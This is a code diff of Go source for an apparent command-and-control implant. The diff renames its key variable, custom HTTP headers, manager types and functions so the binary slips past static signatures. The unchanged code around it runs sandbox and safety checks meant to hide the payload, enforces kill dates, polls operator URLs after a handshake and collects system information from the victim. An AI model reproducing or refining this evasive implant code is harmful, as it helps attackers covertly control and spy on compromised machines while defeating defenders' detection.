@@ -16,7 +16,7 @@ import (
 // Environment variables set during build
 var (
 	// Non-encrypted values
-	xorKey   string
+	cfgKey   string
 	clientID string // This is now used as both initial and current client ID
 	sleep    string
 	jitter   string
@@ -50,15 +50,15 @@ var (
 	// HTTP header names (encrypted to avoid static signatures)
 	httpHeaderUserAgent   string // User-Agent
 	httpHeaderContentType string // Content-Type
-	httpHeaderPadPre      string // X-Pad-Pre
-	httpHeaderPadApp      string // X-Pad-App
+	httpHeaderPadPre      string // X-Cache-Seq
+	httpHeaderPadApp      string // X-Cache-Idx
 	httpMetaId            string // id
 	httpMetaEncryption    string // encryption
 	httpEncRsaAes         string // rsa+aes
 )
 
-// Global HandshakeManager instance
-var handshakeManager *HandshakeManager
+// Global ConnMgr instance
+var handshakeManager *ConnMgr
 
 var clientIDMu sync.RWMutex
 
@@ -78,7 +78,7 @@ func main() {
 	// CRITICAL: Perform safety checks as the VERY FIRST operation
 	// This must happen before any logging, network activity, or system calls
 	// that could reveal the payload's presence
-	if !PerformSafetyChecks() {
+	if !performSafetyChecks() {
 		// Safety checks failed - perform decoy activity and exit silently
 		debugSafetyChecks()
 		os.Exit(1)
@@ -89,22 +89,22 @@ func main() {
 
 	// Initialize logging
 
-	// Create HandshakeManager instance
+	// Create ConnMgr instance
 	var err error
-	handshakeManager, err = NewHandshakeManager()
+	handshakeManager, err = newHandshakeManager()
 	if err != nil {
 		os.Exit(1)
 	}
 
 	// Set initial clientID
-	handshakeManager.SetClientID(getClientID())
+	handshakeManager.setClientID(getClientID())
 
 	// Perform initial handshake (WITHOUT starting polling)
-	if err := handshakeManager.PerformHandshake(); err != nil {
+	if err := handshakeManager.performHandshake(); err != nil {
 		// Implement retry logic with backoff
 		for retries := 1; retries <= 3; retries++ {
 			time.Sleep(time.Duration(retries) * 5 * time.Second)
-			if err := handshakeManager.PerformHandshake(); err == nil {
+			if err := handshakeManager.performHandshake(); err == nil {
 				break
 			} else if retries == 3 {
 				os.Exit(1)
@@ -113,22 +113,22 @@ func main() {
 	}
 
 	// After successful handshake, update the global clientID
-	setClientID(handshakeManager.GetCurrentClientID())
+	setClientID(handshakeManager.getCurrentClientID())
 
 	// Get current configuration for logging purposes
-	//currentClientID := handshakeManager.GetCurrentClientID()
-	getURL, postURL := handshakeManager.GetCurrentURLs()
+	//currentClientID := handshakeManager.getCurrentClientID()
+	getURL, postURL := handshakeManager.getCurrentURLs()
 
 	// Log configuration including custom methods
 	//handshakeManager.decryptedValues["GET Method"],  // Changed to match
 	//handshakeManager.decryptedValues["POST Method"]) // Changed to match
 
 	// START POLLING HERE - Only start it once after successful handshake
-	sysInfoReport, err := CollectSystemInfo(getClientID())
+	sysInfoReport, err := collectSystemInfo(getClientID())
 	if err != nil {
 	}
 
-	pollConfig := PollConfig{
+	pollConfig := SyncConfig{
 		GetURL:          getURL,
 		PostURL:         postURL,
 		DecryptedValues: handshakeManager.decryptedValues,
@@ -146,35 +146,35 @@ func refreshHandshake() error {
 	// Before refreshing, check if safety conditions still apply
 	// This is important for long-running payloads that might exceed working hours
 	// or hit a kill date during execution
-	if !PerformSafetyChecks() {
+	if !performSafetyChecks() {
 		// Gracefully stop polling and exit
-		StopPolling()
+		stopPolling()
 		os.Exit(1)
 	}
 
 
 	// Stop existing polling before starting handshake
-	StopPolling()
+	stopPolling()
 
 	// Perform new handshake (this will NOT start polling anymore)
-	if err := handshakeManager.RefreshHandshake(); err != nil {
+	if err := handshakeManager.refreshHandshake(); err != nil {
 		return err
 	}
 
 	// Update global clientID after successful refresh
-	setClientID(handshakeManager.GetCurrentClientID())
+	setClientID(handshakeManager.getCurrentClientID())
 
 	// Get current URLs for logging
-	getURL, postURL := handshakeManager.GetCurrentURLs()
+	getURL, postURL := handshakeManager.getCurrentURLs()
 
 	// Collect system info for new polling session
-	sysInfoReport, err := CollectSystemInfo(getClientID())
+	sysInfoReport, err := collectSystemInfo(getClientID())
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Initialize new polling config
-	pollConfig := PollConfig{
+	pollConfig := SyncConfig{
 		GetURL:          getURL,
 		PostURL:         postURL,
 		DecryptedValues: handshakeManager.decryptedValues,
